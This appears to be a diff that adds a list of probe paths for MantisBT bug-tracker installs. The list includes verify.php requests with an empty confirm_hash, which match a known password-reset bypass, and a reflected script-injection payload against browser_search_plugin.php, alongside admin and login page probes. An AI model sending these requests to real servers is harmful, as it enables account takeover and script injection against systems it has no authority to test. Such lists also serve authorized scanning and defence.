@@ -1,0 +1,9 @@
+/verify.php?id=1&confirm_hash=
+/mantis/verify.php?id=1&confirm_hash=
+/mantisBT/verify.php?id=1&confirm_hash=
+/mantisbt-2.3.0/verify.php?id=1&confirm_hash=
+/bugs/verify.php?confirm_hash=&id=1
+/admin/install.php
+/login_page.php
+/browser_search_plugin.php?type=text%27%22()%26%25<acx><ScRiPt>alert(document.domain)</ScRiPt>
+/my_view_page.php
